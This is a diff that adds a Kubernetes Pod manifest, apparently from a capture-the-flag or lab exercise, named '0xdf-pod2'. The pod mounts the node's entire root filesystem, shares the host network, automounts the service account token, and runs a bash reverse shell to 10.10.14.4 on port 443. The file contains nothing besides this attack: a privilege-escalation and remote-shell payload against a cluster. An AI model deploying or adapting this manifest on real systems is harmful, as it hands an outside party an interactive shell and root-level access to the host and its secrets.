@@ -1,0 +1,20 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: 0xdf-pod2
+  namespace: default
+spec:
+  containers:
+  - name: 0xdf-pod2
+    image: nginx:1.14.2
+    command: ["/bin/bash"]
+    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.14.4/443 0>&1"]
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
